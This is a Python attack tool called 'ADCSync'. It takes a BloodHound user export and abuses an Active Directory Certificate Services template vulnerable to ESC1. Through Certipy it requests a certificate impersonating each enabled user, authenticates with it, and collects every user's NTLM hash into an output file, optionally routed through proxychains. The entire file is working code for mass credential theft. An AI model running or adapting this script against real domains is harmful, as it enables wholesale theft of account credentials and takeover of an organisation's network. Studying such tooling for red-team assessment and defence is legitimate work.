import json
import os
import shutil
import subprocess
from tqdm import tqdm
from pyfiglet import Figlet
import argparse
# from ldap3 import Server, Connection, ALL, SIMPLE, SYNC, SUBTREE# Print stuff
from dataclasses import dataclass, field
from typing import List

ascii_art = Figlet(font='slant')
print(ascii_art.renderText('ADCSync'))

if shutil.which("certipy"):
    certipy_client = "certipy"
elif shutil.which("certipy-ad"):
    certipy_client = "certipy-ad"
else:
    print("Certipy not found. Please install Certipy before running ADCSync")
    exit(1)

def parse_args():
    parser = argparse.ArgumentParser(description="Process BloodHound JSON user list and retrieve NTLM hashes via ADCS ESC1 technique to simulate DCSync.")
    parser.add_argument('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
    parser.add_argument('-o', '--output', help='NTLM Hash Output file', required=True)
    parser.add_argument('-ca-name', help='Certificate Authority', required=True)
    parser.add_argument('-dc-ip', help='IP Address of Domain Controller', required=True)
    parser.add_argument('-dc-fqdn', help='FQDN of Domain Controller', required=True)
    parser.add_argument('-u', '--user', help='Username', required=True)
    parser.add_argument('-p', '--password', help='Password', required=True)
    parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
    parser.add_argument('-target', help='CA FQDN', required=True)
    parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
    parser.add_argument('-proxychains', action='store_true', help='Use proxychains4 with whatever config you have set in /etc/proxychains.conf')

    return parser.parse_args()

def get_json_data(json_file: str):
    # Read the JSON data from the file
    if not os.path.exists(json_file):
        print(f"Error: File '{json_file}' not found.")
        exit(1)

    try:
        with open(json_file, 'r', encoding='utf-8') as file_obj:
            return json.load(file_obj)
    except json.JSONDecodeError:
        print(f"Error: The file '{json_file}' does not contain valid JSON.")
        exit(1)

@dataclass
class AccountInfo:
    spn: str
    domain: str
    sid: str
    username: str
    usernameLower: str
    pfx_filepath: str

@dataclass
class AccountList:
    accounts: List[AccountInfo] = field(default_factory=list)  # Ensure the list is initialized

def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
    data = get_json_data(file)
    accounts = AccountList()
    # Extract the "name", "objectid", samaccountname, and domain values
    for item in data['nodes']:
        if item['props']['enabled']:
            name = str(item['props']['name']).lower()
            sid = item['props']['objectid']
            baseDomainAD = str(item['props']['domain']).lower()
            justUsernameLower = str(item['props']['samaccountname']).lower()
            justUsername = str(item['props']['samaccountname'])
            accounts.accounts.append(AccountInfo(spn=name, sid=sid, domain=baseDomainAD, username=justUsername, usernameLower=justUsernameLower, pfx_filepath=''))

    # Create the "certificates" folder if it doesn't exist
    certificates_folder = 'certificates'
    if not os.path.exists(certificates_folder):
        os.makedirs(certificates_folder)

    # debug statement
    if debug:
        for account in accounts.accounts:
            print(account)

    # Execute certipy req command for each name
    print(f'[+] Grabbing certs for {len(accounts.accounts)} accounts:')
    for account in tqdm(accounts.accounts):
        upn = f"'{account.spn}'"
        sid = f"'{account.sid}'"
        if proxychains:
            command = [
                'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                  '-template', template, '-upn', upn, '-dns', dc_fqdn, '-sid', sid
            ]
        else:
            command = [
                certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                  '-template', template, '-upn', upn, '-sid', sid
            ]
        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Check the return code and error output of certipy
        if "Could not connect: timed out" in process.stdout:
            print("Could not connect: timed out.")
            exit(1)

        # Move the generated .pfx file to the "certificates" folder if it exists
        for filename in os.listdir('.'):
            if filename.endswith('.pfx') and filename.startswith(account.usernameLower):
                destination = os.path.join(certificates_folder, filename)
                account.pfx_filepath = destination
                shutil.move(filename, destination)

    # Create the "caches" folder if it doesn't exist
    caches_folder = 'caches'
    if not os.path.exists(caches_folder):
        os.makedirs(caches_folder)

    # Execute command for each .pfx file in the "certificates" folder and record the output
    with open(output, 'a') as output_file:
        for account in accounts.accounts:
            if str(account.pfx_filepath).endswith('.pfx'):
                if proxychains:
                    command = ['proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
                else:
                    command = [certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()

                # Extract the NT hash from the stdout
                output_lines = stdout.strip().split('\n')
                ntlm_hash = output_lines[-1].split(': ')[1]

                # Format the output
                output_format = f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)'

                # Print the output to the terminal
                print(output_format)

                # Write the formatted output to the output file
                output_file.write(output_format + '\n')

                # Move the .ccache file to the "caches" folder if it exists
                ccache_file = f'{account.usernameLower}.ccache'
                if os.path.exists(ccache_file):
                    shutil.move(ccache_file, os.path.join(caches_folder, ccache_file))

if __name__ == '__main__':
    args = parse_args()
    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.debug, args.proxychains)
